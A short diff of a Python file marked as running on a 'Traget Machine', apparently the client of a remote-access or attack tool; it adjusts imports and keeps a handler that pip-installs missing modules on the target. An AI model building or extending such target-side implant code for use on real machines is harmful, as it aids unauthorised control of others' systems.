@@ -105,7 +105,6 @@
 ## Runs on Traget Machine ##
 ############################
 
-import os
 try:
 	import sys
 	import pip
@@ -116,7 +115,7 @@ try:
 	import base64
 	from Crypto.Cipher import AES
 	from Crypto import Random
-	from RAW import *
+	from client.core.secure.RAW import *
 except ImportError as e:
 	#pip = lambda : os.system('pip install' + str(e)[15:])
 	pip =  lambda : pip.main(['install', str(e)[15:]])
